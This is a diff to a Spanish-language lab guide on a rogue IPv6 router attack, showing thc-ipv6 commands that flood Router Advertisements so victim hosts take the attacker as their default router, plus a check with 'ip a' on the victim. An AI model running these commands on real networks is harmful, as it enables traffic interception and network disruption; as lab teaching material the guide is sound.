@@ -38,6 +38,7 @@ sudo apt update && sudo apt install thc-ipv6
 sudo ip -6 addr add 2001:1234::1/64 dev eth0
 ```
 
+
 ### Paso 2: Despliegue del Rogue Router:
 Lanzamos el ataque de inundación de paquetes RA. Esto hace que todos los equipos de la red acepten nuestro prefijo `2001:1234::` y nos configuren como su router IPv6 por defecto.
 
@@ -46,6 +47,12 @@ Lanzamos el ataque de inundación de paquetes RA. Esto hace que todos los equipo
 sudo atk6-fake_router6 eth0 2001:1234::/64
 ```
 
+
 ### Paso 3: Verificación en la Víctima (Infección)
 En la máquina víctima (Ubuntu), comprobamos que el ataque ha tenido éxito. 
+
+#### Revisión de la interfaz obtenida:
+```bash
+ip a
+```
 Al ejecutar `ip a`, observamos que la interfaz ha recibido automáticamente una dirección global del rango `2001:1234...` mediante SLAAC.
